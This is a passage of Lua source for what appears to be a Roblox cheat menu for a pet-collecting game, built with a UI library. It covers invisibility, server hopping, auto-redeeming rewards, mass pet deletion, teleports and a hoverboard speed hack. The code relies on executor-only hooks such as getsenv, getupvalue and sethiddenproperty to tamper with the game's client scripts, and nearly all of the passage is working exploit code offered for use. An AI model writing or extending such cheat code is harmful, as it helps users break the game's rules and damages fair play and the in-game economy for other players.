            Seat.Anchored = false
            Seat.CanCollide = false
            Seat.Name = 'InvisibleSeat'
            Seat.Transparency = 1
            Seat.Position = Vector3.new(0, -200, 0)
            local Weld = Instance.new(""Weld"", Seat)
            Weld.Part0 = Seat
            Weld.Part1 = game.Players.LocalPlayer.Character:FindFirstChild(""Torso"") or game.Players.LocalPlayer.Character.UpperTorso
            wait()
            Seat.CFrame = SavedPos
            game.StarterGui:SetCore(""SendNotification"", {
                Title = ""Invis On"";
                Duration = 1;
                Text = """";
            })
        else
            workspace:FindFirstChild('InvisibleSeat'):Remove()
            game.StarterGui:SetCore(""SendNotification"", {
                Title = ""Invis Off"";
                Duration = 1;
                Text = """";
            })
        end
    end
})

BoothsTab:CreateToggle({
	Name = ""Walk To Booth [Experimental]"",
    CurrentValue = Config.Booths.Extra.WalkToBooth,
    Flag = ""ToggleWalkToBooth"",
	Callback = function(Value)
        Config.Booths.Extra.WalkToBooth = Value
    end
})

BoothsTab:CreateToggle({
	Name = ""Booth Server Hop"",
    CurrentValue = Config.Booths.Extra.BoothServerHop,
    Flag = ""ToggleBoothServerHop"",
	Callback = function(Value)
        Config.Booths.Extra.BoothServerHop = Value
        SaveConfig()
        task.spawn(function()
            while Config.Booths.Extra.BoothServerHop and task.wait() do
                if not Config.Booths.Extra.BoothServerHop then break end
                if #Players:GetChildren() <= 10 then
                    ServerTeleport(""Trading Plaza"")
                end
            end
        end)
        task.spawn(function()
            while Config.Booths.Extra.BoothServerHop and task.wait(Config.Booths.Extra.BoothServerHopSeconds) do
                if not Config.Booths.Extra.BoothServerHop then break end 
                ServerTeleport(""Trading Plaza"")
            end
        end)
    end
})

BoothsTab:CreateToggle({
	Name = ""Booth Voice Chat Server Hop (Voice Chat Required)"",
    CurrentValue = Config.Booths.Extra.BoothServerHopVoice,
    Flag = ""ToggleBoothServerHopVoice"",
	Callback = function(Value)
        Config.Booths.Extra.BoothServerHopVoice = Value
        SaveConfig()
        task.spawn(function()
            while Config.Booths.Extra.BoothServerHopVoice and task.wait() do
                if not Config.Booths.Extra.BoothServerHopVoice then break end
                if #Players:GetChildren() <= 10 then
                    ServerTeleport(""Trading Plaza Voice Chat"")
                end
            end
        end)
        task.spawn(function()
            task.wait(2)
            while Config.Booths.Extra.BoothServerHopVoice and task.wait(Config.Booths.Extra.BoothServerHopSeconds) do
                if not Config.Booths.Extra.BoothServerHopVoice then break end
                ServerTeleport(""Trading Plaza Voice Chat"")
            end
        end)
    end
})

local BoothSniperLabel = BoothsTab:CreateLabel((Config.Booths.Extra.BoothServerHopSeconds / 60).."" Minutes"")

BoothsTab:CreateInput({
	Name = ""Amount Of SECONDS"",
	PlaceholderText = Config.Booths.Extra.BoothServerHopSeconds,
	RemoveTextAfterFocusLost = false,
	Callback = function(Value)
        Config.Booths.Extra.BoothServerHopSeconds = Value
        BoothSniperLabel:Set((Config.Booths.Extra.BoothServerHopSeconds / 60).."" Minutes"")
	end
})


local DeletingTab = Window:CreateTab(""Delete Pets (🚫)"")

local PetDeletingSection = DeletingTab:CreateSection(""Pet Deleting"")

DeletingTab:CreateToggle({
	Name = ""Start Deleting"",
    CurrentValue = Config.Deleting.StartDelete,
    Flag = ""ToggleStartDelete"",
	Callback = function(Value)
        Config.Deleting.StartDelete = Value
        task.spawn(function()
            while Config.Deleting.StartDelete and task.wait() do
                DeletePets()
            end
        end)
    end
})

DeletingTab:CreateToggle({
	Name = ""Delete By Rarity"",
    CurrentValue = Config.Deleting.DeleteByRarity,
    Flag = ""ToggleDeleteByRarity"",
	Callback = function(Value)
        Config.Deleting.DeleteByRarity = Value
    end
})

local PetsToDeleteSection = DeletingTab:CreateSection(""Pets"")

DeletingTab:CreateInput({
	Name = ""Choosen Pet"",
	PlaceholderText = Config.Deleting.ChoosenPetToDelete,
	RemoveTextAfterFocusLost = false,
	Callback = function(Value)
        if tonumber(Value) then
            Value = Value
        else
            for i,v in pairs(Library.Directory.Pets) do
                if v.name == Value then
                    Value = i
                end
            end
        end
        Config.Deleting.ChoosenPetToDelete = Value
	end
})

local SellingOptionsSection = DeletingTab:CreateSection(""Options"")

local SelectedDeleteOptions = DeletingTab:CreateParagraph({Title = ""Selected Types"", Content = table.concat(Config.Deleting.Options, "", "")})

DeletingTab:CreateDropdown({
	Name = ""Choose Types"",
	CurrentOption = """",
	Options = TypeList,
	Callback = function(Value)
        if not table.find(Config.Deleting.Options, Value) then
            table.insert(Config.Deleting.Options, Value)
        elseif table.find(Config.Deleting.Options, Value) then
            for i,v in pairs(Config.Deleting.Options) do
                if v == Value then
                    table.remove(Config.Deleting.Options, i)
                end
            end
        end
        SelectedDeleteOptions:Set({Title = ""Selected Types"", Content = table.concat(Config.Deleting.Options, "", "")})
	end
})

local PetsToDeleteRaritiesSection = DeletingTab:CreateSection(""Rarities"")

local SelectedDeleteRarities = DeletingTab:CreateParagraph({Title = ""Selected Rarities"", Content = table.concat(Config.Deleting.Rarities, "", "")})

DeletingTab:CreateDropdown({
	Name = ""Choose Rarities"",
	CurrentOption = """",
	Options = RaritiesWithoutExclusiveList,
	Callback = function(Value)
        if not table.find(Config.Deleting.Rarities, Value) then
            table.insert(Config.Deleting.Rarities, Value)
        elseif table.find(Config.Deleting.Rarities, Value) then
            for i,v in pairs(Config.Deleting.Rarities) do
                if v == Value then
                    table.remove(Config.Deleting.Rarities, i)
                end
            end
        end
        SelectedDeleteRarities:Set({Title = ""Selected Rarities"", Content = table.concat(Config.Deleting.Rarities, "", "")})
	end
})

local MiscTab = Window:CreateTab(""Misc (💡)"")

local RedeemingSection = MiscTab:CreateSection(""Redeeming"")

MiscTab:CreateToggle({
	Name = ""Redeem Rank Rewards"",
    CurrentValue = Config.Misc.Redeeming.RedeemRankRewards,
    Flag = ""ToggleRedeemRankRewards"",
	Callback = function(Value)
        Config.Misc.Redeeming.RedeemRankRewards = Value
        task.spawn(function()
            while Config.Misc.Redeeming.RedeemRankRewards and task.wait() do
                pcall(function()
                    if Workspace[""__MAP""].Interactive[""Rank Rewards""].Pad.BillboardGui.Timer.Text == ""Redeem!"" then
                        UseRemote(Remotes[""Redeem Rank Rewards""])
                    end
                end)
            end
        end)
    end
})

MiscTab:CreateToggle({
	Name = ""Redeem VIP Rewards"",
    CurrentValue = Config.Misc.Redeeming.RedeemVIPRewards,
    Flag = ""ToggleRedeemVIPRewards"",
	Callback = function(Value)
        Config.Misc.Redeeming.RedeemVIPRewards = Value
        task.spawn(function()
            while Config.Misc.Redeeming.RedeemVIPRewards and task.wait() do
                pcall(function()
                    if Workspace[""__MAP""].Interactive[""VIP Rewards""].Pad.BillboardGui.Timer.Text == ""Redeem!"" then
                        UseRemote(Remotes[""Redeem VIP Rewards""])
                    end
                end)
            end
        end)
    end
})

MiscTab:CreateToggle({
	Name = ""Redeem Free Gift"",
    CurrentValue = Config.Misc.Redeeming.RedeemFreeGifts,
    Flag = ""ToggleRedeemFreeGifts"",
	Callback = function(Value)
        Config.Misc.Redeeming.RedeemFreeGifts = Value
        task.spawn(function()
            while Config.Misc.Redeeming.RedeemFreeGifts and task.wait() do
                for i,v in pairs(Player.PlayerGui.FreeGifts.Frame.Container.Gifts:GetDescendants()) do
                    if v.Name == ""Timer"" and v.Text == ""Redeem!"" then
                        UseRemote(Remotes[""Redeem Free Gift""], tonumber(v.Parent.Name:split(""Gift"")[2]))
                    end
                end
            end
        end)
    end
})

local TeleportsSection = MiscTab:CreateSection(""Teleports"")

MiscTab:CreateButton({
	Name = ""Teleport To Normal Experience"",
	Callback = function()
        LowServerTeleport(true, 6284583030)
  	end
})

MiscTab:CreateButton({
	Name = ""Teleport To Hardcore Experience"",
	Callback = function()
        LowServerTeleport(true, 10321372166)
  	end
})

MiscTab:CreateButton({
	Name = ""Teleport To Trading Plaza"",
	Callback = function()
        ServerTeleport(""Trading Plaza"")
  	end
})

MiscTab:CreateButton({
	Name = ""Teleport To Voice Chat Plaza (VOICE CHAT REQUIRED)"",
	Callback = function()
        ServerTeleport(""Trading Plaza Voice Chat"")
  	end
})

MiscTab:CreateToggle({
	Name = ""Auto Join Normal Experience"",
    CurrentValue = Config.Misc.Teleports.LoadNormalExperience,
    Flag = ""ToggleLoadNormalExperience"",
	Callback = function(Value)
        Config.Misc.Teleports.LoadNormalExperience = Value
        task.spawn(function()
            SaveConfig()
            if Value then
                RayField.Flags[""ToggleLoadHardcoreExperience""]:Set(false)
                RayField.Flags[""ToggleLoadTradingExperience""]:Set(false)
                RayField.Flags[""ToggleLoadTradingVoiceExperience""]:Set(false)
            end
            task.wait(2)
            while Config.Misc.Teleports.LoadNormalExperience and task.wait(1) do
                if game.PlaceId ~= 6284583030 then
                    LowServerTeleport(true, 6284583030)
                end
            end
        end)
    end
})

MiscTab:CreateToggle({
	Name = ""Auto Join Hardcore Experience"",
    CurrentValue = Config.Misc.Teleports.LoadHardcoreExperience,
    Flag = ""ToggleLoadHardcoreExperience"",
	Callback = function(Value)
        Config.Misc.Teleports.LoadHardcoreExperience = Value
        task.spawn(function()
            SaveConfig()
            if Value then
                RayField.Flags[""ToggleLoadNormalExperience""]:Set(false)
                RayField.Flags[""ToggleLoadTradingExperience""]:Set(false)
                RayField.Flags[""ToggleLoadTradingVoiceExperience""]:Set(false)
            end
            task.wait(2)
            while Config.Misc.Teleports.LoadHardcoreExperience and task.wait(1) do
                if game.PlaceId ~= 10321372166 then
                    LowServerTeleport(true, 10321372166)
                end
            end
        end)
    end
})

MiscTab:CreateToggle({
	Name = ""Auto Join Trading Plaza"",
    CurrentValue = Config.Misc.Teleports.LoadTradingExperience,
    Flag = ""ToggleLoadTradingExperience"",
	Callback = function(Value)
        Config.Misc.Teleports.LoadTradingExperience = Value
        task.spawn(function()
            SaveConfig()
            if Value then
                RayField.Flags[""ToggleLoadNormalExperience""]:Set(false)
                RayField.Flags[""ToggleLoadHardcoreExperience""]:Set(false)
                RayField.Flags[""ToggleLoadTradingVoiceExperience""]:Set(false)
            end
            task.wait(2)
            while Config.Misc.Teleports.LoadTradingExperience and task.wait(1) do
                if game.PlaceId ~= 7722306047 then
                    ServerTeleport(""Trading Plaza"")
                end
            end
        end)
    end
})

MiscTab:CreateToggle({
	Name = ""Auto Join Voice Chat Trading Plaza"",
    CurrentValue = Config.Misc.Teleports.LoadTradingVoiceExperience,
    Flag = ""ToggleLoadTradingVoiceExperience"",
	Callback = function(Value)
        Config.Misc.Teleports.LoadTradingVoiceExperience = Value
        task.spawn(function()
            SaveConfig()
            if Value then
                RayField.Flags[""ToggleLoadNormalExperience""]:Set(false)
                RayField.Flags[""ToggleLoadHardcoreExperience""]:Set(false)
                RayField.Flags[""ToggleLoadTradingExperience""]:Set(false)
            end
            task.wait(2)
            while Config.Misc.Teleports.LoadTradingVoiceExperience and task.wait(1) do
                if game.PlaceId ~= 11725212117 then
                    ServerTeleport(""Trading Plaza Voice Chat"")
                end
            end
        end)
    end
})

local HoverboardsSection = MiscTab:CreateSection(""Hoverboards"")

MiscTab:CreateDropdown({
	Name = ""Hoverboards"",
	CurrentOption = Config.Misc.Hoverboards.CurrentHoverboard,
	Options = HoverboardList,
	Callback = function(Value)
        Config.Misc.Hoverboards.CurrentHoverboard = Value
	end
})

MiscTab:CreateButton({
	Name = ""Set Hoverboard"",
	Callback = function()
        Library.Save.Get().EquippedHoverboard = Config.Misc.Hoverboards.CurrentHoverboard
  	end
})

MiscTab:CreateSlider({
	Name = ""Hoverboard Speed"",
    Range = {1,300},
	CurrentValue = Config.Misc.Hoverboards.HoverboardSpeed,
	Increment = 1,
	Suffix = ""Speed"",
    Flag = ""HoverboardSpeedValue"",
	Callback = function(Value)
        Config.Misc.Hoverboards.HoverboardSpeed = Value
	end
})

MiscTab:CreateButton({
	Name = ""Set Hoverboard Speed"",
	Callback = function()
        Library.Directory.Hoverboards[Config.Misc.Hoverboards.CurrentHoverboard].speed = 3
        getupvalue(getsenv(Scripts.Game.Hoverboard).Create, 3)[3] = Config.Misc.Hoverboards.HoverboardSpeed
  	end
})

local BoostsSection = MiscTab:CreateSection(""Boosts"")

MiscTab:CreateToggle({
	Name = ""Use Boosts"",
    CurrentValue = Config.Misc.Boosting.UseBoosts,
    Flag = ""ToggleUseBoosts"",
	Callback = function(Value)
        Config.Misc.Boosting.UseBoosts = Value
        task.spawn(function()
            while Config.Misc.Boosting.UseBoosts and task.wait(1) do
                ActivateBoosts()
            end
        end)
    end
})

MiscTab:CreateToggle({
	Name = ""Use All Boosts"",
    CurrentValue = Config.Misc.Boosting.UseAllBoosts,
    Flag = ""ToggleUseAllBoosts"",
	Callback = function(Value)
        Config.Misc.Boosting.UseAllBoosts = Value
        task.spawn(function()
            while Config.Misc.Boosting.UseAllBoosts and task.wait() do
                ActivateBoosts()
            end
        end)
    end
})

local SelectedBoosts = MiscTab:CreateParagraph({Title = ""Selected Boosts"", Content = table.concat(Config.Misc.Boosting.BoostsToActivate, "", "")})

MiscTab:CreateDropdown({
	Name = ""Choose Boosts"",
	CurrentOption = """",
	Options = {""Triple Coins"", ""Triple Damage"", ""Super Lucky"", ""Ultra Lucky""},
	Callback = function(Value)
        if not table.find(Config.Misc.Boosting.BoostsToActivate, Value) then
            table.insert(Config.Misc.Boosting.BoostsToActivate, Value)
        elseif table.find(Config.Misc.Boosting.BoostsToActivate, Value) then
            for i,v in pairs(Config.Misc.Boosting.BoostsToActivate) do
                if v == Value then
                    table.remove(Config.Misc.Boosting.BoostsToActivate, i)
                end
            end
        end
        SelectedBoosts:Set({Title = ""Selected Boosts"", Content = table.concat(Config.Misc.Boosting.BoostsToActivate, "", "")})
	end
})

local ServerBoostsSection = MiscTab:CreateSection(""Server Boosts"")

MiscTab:CreateToggle({
	Name = ""Use Server Boosts"",
    CurrentValue = Config.Misc.Boosting.UseServerBoosts,
    Flag = ""ToggleUseServerBoosts"",
	Callback = function(Value)
        Config.Misc.Boosting.UseServerBoosts = Value
        task.spawn(function()
            while Config.Misc.Boosting.UseServerBoosts and task.wait(1) do
                ActivateServerBoosts()
            end
        end)
    end
})

local SelectedServerBoosts = MiscTab:CreateParagraph({Title = ""Selected Server Boosts"", Content = table.concat(Config.Misc.Boosting.ServerBoostsToActivate, "", "")})

MiscTab:CreateDropdown({
	Name = ""Choose Server Boosts"",
	CurrentOption = """",
	Options = {""Triple Coins"", ""Triple Damage"", ""Super Lucky""},
	Callback = function(Value)
        if not table.find(Config.Misc.Boosting.ServerBoostsToActivate, Value) then
            table.insert(Config.Misc.Boosting.ServerBoostsToActivate, Value)
        elseif table.find(Config.Misc.Boosting.ServerBoostsToActivate, Value) then
            for i,v in pairs(Config.Misc.Boosting.ServerBoostsToActivate) do
                if v == Value then
                    table.remove(Config.Misc.Boosting.ServerBoostsToActivate, i)
                end
            end
        end
        SelectedServerBoosts:Set({Title = ""Selected Server Boosts"", Content = table.concat(Config.Misc.Boosting.ServerBoostsToActivate, "", "")})
	end
})

local MiscExtraSection = MiscTab:CreateSection(""Extra"")

MiscTab:CreateToggle({
	Name = ""Stats Tracker"",
    CurrentValue = Config.Misc.Extra.StatsTracker,
    Flag = ""ToggleStatsTracker"",
	Callback = function(Value)
        Config.Misc.Extra.StatsTracker = Value
        EnableStatsTracker()
    end
})

MiscTab:CreateToggle({
	Name = ""Reduce Lag"",
    CurrentValue = Config.Misc.Extra.ReduceLag,
    Flag = ""ToggleReduceLag"",
	Callback = function(Value)
        Config.Misc.Extra.ReduceLag = Value
        if Config.Misc.Extra.ReduceLag then
            local a = game
            local b = a.Workspace
            local c = a.Lighting
            local d = b.Terrain
            d.WaterWaveSize = 0
            d.WaterWaveSpeed = 0
            d.WaterReflectance = 0
            d.WaterTransparency = 0
            c.GlobalShadows = false
            c.FogEnd = 9e9
            c.Brightness = 0
            settings().Rendering.QualityLevel = ""Level01""
            for e, f in pairs(a:GetDescendants()) do
               if f:IsA(""Part"") or f:IsA(""Union"") or f:IsA(""CornerWedgePart"") or f:IsA(""TrussPart"") then
                   f.Material = ""Plastic""
                   f.Reflectance = 0
               elseif f:IsA(""Decal"") or f:IsA(""Texture"") then
                   f.Transparency = 0
               elseif f:IsA(""ParticleEmitter"") or f:IsA(""Trail"") then
                   f.Lifetime = NumberRange.new(0)
               elseif f:IsA(""Explosion"") then
                   f.BlastPressure = 0
                   f.BlastRadius = 0
               elseif f:IsA(""Fire"") or f:IsA(""SpotLight"") or f:IsA(""Smoke"") or f:IsA(""Sparkles"") then
                   f.Enabled = false
               elseif f:IsA(""MeshPart"") then
                   f.Material = ""Plastic""
                   f.Reflectance = 0
                   f.TextureID = 10385902758728957
               end
            end
            for e, g in pairs(c:GetChildren()) do
               if
                   g:IsA(""BlurEffect"") or g:IsA(""SunRaysEffect"") or g:IsA(""ColorCorrectionEffect"") or g:IsA(""BloomEffect"") or
                       g:IsA(""DepthOfFieldEffect"")
                then
                   g.Enabled = false
               end
            end
            sethiddenproperty(game.Lighting, ""Technology"", ""Compatibility"")
        end
    end
})

local PetCollectionTab = Window:CreateTab(""Pet Collection (🖥️)"")

local CollectionSettingsSection = PetCollectionTab:CreateSection(""Settings For Pet Collection"")

local CollectionStats = PetCollectionTab:CreateParagraph({Title = ""Statistics"", Content = ""Pets Collected: ""..#Library.Save.Get().Collection..""/""..#Library.Shared.GetAllCollectablePets()})

PetCollectionTab:CreateToggle({
	Name = ""Start Collecting Pets"",
    CurrentValue = Config.PetCollection.StartCollecting,
    Flag = ""ToggleCollectingPets"",
	Callback = function(Value)
        Config.PetCollection.StartCollecting = Value
        task.spawn(function()
            while Config.PetCollection.StartCollecting and task.wait() do
                CollectPets()
                CollectionStats:Set({Title = ""Statistics"", Content = ""Pets Collected: ""..#Library.Save.Get().Collection..""/""..#Library.Shared.GetAllCollectablePets()})
            end
        end)
    end
})

PetCollectionTab:CreateDropdown({
	Name = ""Choose Mode"",
	CurrentOption = Config.PetCollection.Mode,
	Options = {""Single"", ""Triple"", ""Octuple""},
    Flag = ""CollectionModeOption"",
	Callback = function(Value)
		Config.PetCollection.Mode = Value
	end
})

local SelectedCollectingOptions = PetCollectionTab:CreateParagraph({Title = ""Selected Types"", Content = table.concat(Config.PetCollection.Options, "", "")})

PetCollectionTab:CreateDropdown({
	Name = ""Choose Types"",
	CurrentOption = """",
	Options = TypesForCollectionList,
	Callback = function(Value)
        if not table.find(Config.PetCollection.Options, Value) then
            table.insert(Config.PetCollection.Options, Value)
        elseif table.find(Config.PetCollection.Options, Value) then
            for i,v in pairs(Config.PetCollection.Options) do
                if v == Value then
                    table.remove(Config.PetCollection.Options, i)
                end
            end
        end
        SelectedCollectingOptions:Set({Title = ""Selected Types"", Content = table.concat(Config.PetCollection.Options, "", "")})
	end
})

local SelectedCollectionRarities = PetCollectionTab:CreateParagraph({Title = ""Selected Rarities"", Content = table.concat(Config.PetCollection.Rarities, "", "")})

PetCollectionTab:CreateDropdown({
	Name = ""Choose Rarities"",
	CurrentOption = """",
	Options = RaritiesWithoutExclusiveList,
	Callback = function(Value)
        if not table.find(Config.PetCollection.Rarities, Value) then
            table.insert(Config.PetCollection.Rarities, Value)
        elseif table.find(Config.PetCollection.Rarities, Value) then
            for i,v in pairs(Config.PetCollection.Rarities) do
                if v == Value then
                    table.remove(Config.PetCollection.Rarities, i)
                end
            end
        end
        SelectedCollectionRarities:Set({Title = ""Selected Rarities"", Content = table.concat(Config.PetCollection.Rarities, "", "")})
	end
})

local MasteryTab = Window:CreateTab(""Mastery (✨)"")

local MasterySettingsSection = MasteryTab:CreateSection(""Settings For Mastery"")

MasteryTab:CreateToggle({
	Name = ""Start Completing Mastery"",
    CurrentValue = Config.Mastery.StartCompletingMasterys,
    Flag = ""ToggleCompleteMasterys"",
	Callback = function(Value)
        Config.Mastery.StartCompletingMasterys = Value
        task.spawn(function()
            while Config.Mastery.StartCompletingMasterys and task.wait() do
                CompleteMasterys()
            end
        end)
    end
})

local SelectedMasterys = MasteryTab:CreateParagraph({Title = ""Selected Masteries"", Content = table.concat(Config.Mastery.MasterysToFarm, "", "")})

MasteryTab:CreateDropdown({
	Name = ""Choose Masteries"",
	CurrentOption = """",
	Options = MasteryList,
	Callback = function(Value)
        if not table.find(Config.Mastery.MasterysToFarm, Value) then
            table.insert(Config.Mastery.MasterysToFarm, Value)
        elseif table.find(Config.Mastery.MasterysToFarm, Value) then
            for i,v in pairs(Config.Mastery.MasterysToFarm) do
                if v == Value then
                    table.remove(Config.Mastery.MasterysToFarm, i)
                end
            end
        end
        SelectedMasterys:Set({Title = ""Selected Masteries"", Content = table.concat(Config.Mastery.MasterysToFarm, "", "")})
	end
})


local GuisTab = Window:CreateTab(""GUIs (🔖)"")

local GuiSettings = GuisTab:CreateSection(""Settings For Guis"")

GuisTab:CreateToggle({
	Name = ""Walk To Gui Location"",
    CurrentValue = Config.Guis.WalkToGui,
    Flag = ""ToggleWalkToGui"",
	Callback = function(Value)
        Config.Guis.WalkToGui = Value
    end
})

local GuisMachinesSection = GuisTab:CreateSection(""Machines"")

GuisTab:CreateKeybind({
	Name = ""Golden Machine"",
	CurrentKeybind = Config.Guis.GuiMachines.GoldenMachine,
	HoldToInteract = false,
	Flag = ""GoldenMachineKeybind"",
	Callback = function(Keybind)
        Config.Guis.GuiMachines.GoldenMachine = Keybind
        pcall(function()
            getsenv(Scripts.GUIs.Teleport).Teleport(""Shop"")
            if Config.Guis.WalkToGui then
                task.wait(5)
                FindPath(Workspace[""__MAP""].Interactive[""Gold Machine""].Pad)
            else
                GetHumanoidRootPart().CFrame = Workspace[""__MAP""].Interactive[""Gold Machine""].Pad.CFrame
            end
        end)
    end
})

GuisTab:CreateKeybind({
	Name = ""Rainbow Machine"",
	CurrentKeybind = Config.Guis.GuiMachines.RainbowMachine,
	HoldToInteract = false,
	Flag = ""RainbowMachineKeybind"",
	Callback = function(Keybind)
        Config.Guis.GuiMachines.GoldenMachine = Keybind
        pcall(function()
            getsenv(Scripts.GUIs.Teleport).Teleport(""Mine"")
            if Config.Guis.WalkToGui then
                task.wait(5)
                FindPath(Workspace[""__MAP""].Interactive[""Rainbow Machine""].Pad)
            else
                GetHumanoidRootPart().CFrame = Workspace[""__MAP""].Interactive[""Rainbow Machine""].Pad.CFrame
            end
        end)
	end
})

GuisTab:CreateKeybind({
	Name = ""Dark Matter Machine"",
	CurrentKeybind = Config.Guis.GuiMachines.DarkMatterMachine,
	HoldToInteract = false,
	Flag = ""DarkMatterKeybind"",
	Callback = function(Keybind)
        Config.Guis.GuiMachines.DarkMatterMachine = Keybind
        pcall(function()
            getsenv(Scripts.GUIs.Teleport).Teleport(""Dark Tech"")
            if Config.Guis.WalkToGui then
                task.wait(5)
                FindPath(Workspace[""__MAP""].Interactive[""Dark Matter Machine""].Pad)
            else
                GetHumanoidRootPart().CFrame = Workspace[""__MAP""].Interactive[""Dark Matter Machine""].Pad.CFrame
            end
        end)
    end
})

GuisTab:CreateKeybind({
	Name = ""Fuse Machine"",
	CurrentKeybind = Config.Guis.GuiMachines.FuseMachine,
	HoldToInteract = false,
	Flag = ""FuseMachineKeybind"",
	Callback = function(Keybind)
        Config.Guis.GuiMachines.FuseMachine = Keybind
        pcall(function()
            getsenv(Scripts.GUIs.Teleport).Teleport(""Beach"")
            if Config.Guis.WalkToGui then
                task.wait(5)
                FindPath(Workspace[""__MAP""].Interactive[""Fuse Pets""].Pad)
            else
                GetHumanoidRootPart().CFrame = Workspace[""__MAP""].Interactive[""Fuse Pets""].Pad.CFrame
            end
        end)
    end
})

GuisTab:CreateKeybind({
	Name = ""Enchant Machine"",
	CurrentKeybind = Config.Guis.GuiMachines.EnchantMachine,
	HoldToInteract = false,
	Flag = ""EnchantMachineKeybind"",
	Callback = function(Keybind)
        Config.Guis.GuiMachines.EnchantMachine = Keybind
        pcall(function()
            getsenv(Scripts.GUIs.Teleport).Teleport(""Enchanted Forest"")
            if Config.Guis.WalkToGui then
                task.wait(5)
                FindPath(Workspace[""__MAP""].Interactive[""Enchanting""].Pad)
            else
                GetHumanoidRootPart().CFrame = Workspace[""__MAP""].Interactive[""Enchanting""].Pad.CFrame
            end
        end)
    end
})

GuisTab:CreateKeybind({
	Name = ""Bank Machine"",
	CurrentKeybind = Config.Guis.GuiMachines.BankMachine,
	HoldToInteract = false,
	Flag = ""BankMachineKeybind"",
	Callback = function(Keybind)
        Config.Guis.GuiMachines.BankMachine = Keybind
        pcall(function()
            getsenv(Scripts.GUIs.Teleport).Teleport(""Shop"")
            if Config.Guis.WalkToGui then
                task.wait(5)
                FindPath(Workspace[""__MAP""].Interactive[""Bank""].Pad)
            else
                GetHumanoidRootPart().CFrame = Workspace[""__MAP""].Interactive[""Bank""].Pad.CFrame
            end
        end)
    end
})

GuisTab:CreateKeybind({
	Name = ""Server Boost Machine"",
	CurrentKeybind = ""V"",
	HoldToInteract = false,
	Flag = ""ServerBoostMachineKeybind"",
	Callback = function(Keybind)
        Config.Guis.GuiMachines.ServerBoostMachine = Keybind
        pcall(function()
            getsenv(Scripts.GUIs.Teleport).Teleport(""The Void"")
            if Config.Guis.WalkToGui then
                task.wait(5)
                FindPath(Workspace[""__MAP""].Interactive[""Boost Machine""].Pad)
            else
                GetHumanoidRootPart().CFrame = Workspace[""__MAP""].Interactive[""Boost Machine""].Pad.CFrame
            end
        end)
    end
})

local WebhooksTab = Window:CreateTab(""Webhooks (📬)"")

local WebhookHatchingSection = WebhooksTab:CreateSection(""Hatching"")

local OldSavedHatchedPets = Library.Save.Get().Pets
WebhooksTab:CreateToggle({
	Name = ""Start Hatch Webhook"",
    CurrentValue = Config.Webhooks.HatchWebhook.StartWebhook,
    Flag = ""ToggleStartHatchWebhook"",
	Callback = function(Value)
        Config.Webhooks.HatchWebhook.StartWebhook = Value
        if getgenv().OpenEggConnection then getgenv().OpenEggConnection:Disconnect() end
        task.spawn(function()
            repeat task.wait() until RemotesLoaded
            LPH_NO_VIRTUALIZE(function()
                getgenv().OpenEggConnection = Library.Network.Fired(""Open Egg""):Connect(function(EggName, PetsTable)
                    for i,v in pairs(PetsTable) do
                        repeat task.wait() until CheckForPet(v.uid)
                        local ReadyToSendHatchWebhook = false
                        if (table.find(Config.Webhooks.HatchWebhook.Rarities, ""Basic"") and Library.Directory.Pets[v.id].rarity == ""Basic"") or (table.find(Config.Webhooks.HatchWebhook.Rarities, ""Rare"") and Library.Directory.Pets[v.id].rarity == ""Rare"") or (table.find(Config.Webhooks.HatchWebhook.Rarities, ""Epic"") and Library.Directory.Pets[v.id].rarity == ""Epic"") or (table.find(Config.Webhooks.HatchWebhook.Rarities, ""Legendary"") and Library.Directory.Pets[v.id].rarity == ""Legendary"") or (table.find(Config.Webhooks.HatchWebhook.Rarities, ""Mythical"") and Library.Directory.Pets[v.id].rarity == ""Mythical"") or (table.find(Config.Webhooks.HatchWebhook.Rarities, ""Secret"") and Library.Directory.Pets[v.id].rarity == ""Secret"") or (table.find(Config.Webhooks.HatchWebhook.Rarities, ""Exclusive"") and Library.Directory.Pets[v.id].rarity == ""Exclusive"")  then
                            ReadyToSendHatchWebhook = true
                        end
                        if ReadyToSendHatchWebhook and Config.Webhooks.HatchWebhook.StartWebhook then
                            SendHatchWebhook(v, EggName)
                        end
                        if v.powers then
                            SendMiscHatchWebhook(v, EggName)
                        end
                    end
                end)
            end)()
        end)
    end
})


WebhooksTab:CreateInput({
	Name = ""Discord Webhook"",
	PlaceholderText  = Config.Webhooks.HatchWebhook.ChoosenWebhook,
	RemoveTextAfterFocusLost  = false,
	Callback = function(Value)
        Config.Webhooks.HatchWebhook.ChoosenWebhook = Value
	end
})

WebhooksTab:CreateToggle({
	Name = ""Ping User"",
    CurrentValue = Config.Webhooks.HatchWebhook.PingUser,
    Flag = ""ToggleHatchPingUser"",
	Callback = function(Value)
        Config.Webhooks.HatchWebhook.PingUser = Value
    end
})

WebhooksTab:CreateInput({
	Name = ""ID To Ping"",
	PlaceholderText  = Config.Webhooks.HatchWebhook.ChoosenUserID,
	RemoveTextAfterFocusLost  = false,
	Callback = function(Value)
		Config.Webhooks.HatchWebhook.ChoosenUserID = Value
	end
})

WebhooksTab:CreateToggle({
	Name = ""Show Chances"",
    CurrentValue = Config.Webhooks.HatchWebhook.ShowChances,
    Flag = ""ToggleHatchShowChances"",
	Callback = function(Value)
        Config.Webhooks.HatchWebhook.ShowChances = Value
    end
})

WebhooksTab:CreateToggle({
	Name = ""Show Eggs Hatched"",
    CurrentValue = Config.Webhooks.HatchWebhook.ShowEggsHatched,
    Flag = ""ToggleHatchShowEggsHatched"",
	Callback = function(Value)
        Config.Webhooks.HatchWebhook.ShowEggsHatched = Value
    end
})

WebhooksTab:CreateToggle({
	Name = ""Show Eggs Remaining"",
    CurrentValue = Config.Webhooks.HatchWebhook.ShowEggsRemaining,
    Flag = ""ToggleHatchShowEggsRemaining"",
	Callback = function(Value)
        Config.Webhooks.HatchWebhook.ShowEggsRemaining = Value
    end
})

WebhooksTab:CreateToggle({
	Name = ""Show Currency Remaining"",
    CurrentValue = Config.Webhooks.HatchWebhook.ShowCurrencyRemaining,
    Flag = ""ToggleHatchShowCurrencyRemaining"",
	Callback = function(Value)
        Config.Webhooks.HatchWebhook.ShowCurrencyRemaining = Value
    end
})

WebhooksTab:CreateToggle({
	Name = ""Show Strength"",
    CurrentValue = Config.Webhooks.HatchWebhook.ShowStrength,
    Flag = ""ToggleHatchShowStrength"",
	Callback = function(Value)
        Config.Webhooks.HatchWebhook.ShowStrength = Value
    end
})

WebhooksTab:CreateToggle({
	Name = ""Show Enchants"",
    CurrentValue = Config.Webhooks.HatchWebhook.ShowEnchants,
    Flag = ""ToggleHatchShowEnchants"",
	Callback = function(Value)
        Config.Webhooks.HatchWebhook.ShowEnchants = Value
    end
})

local WebhookPetRarities = WebhooksTab:CreateSection(""Rarities"")

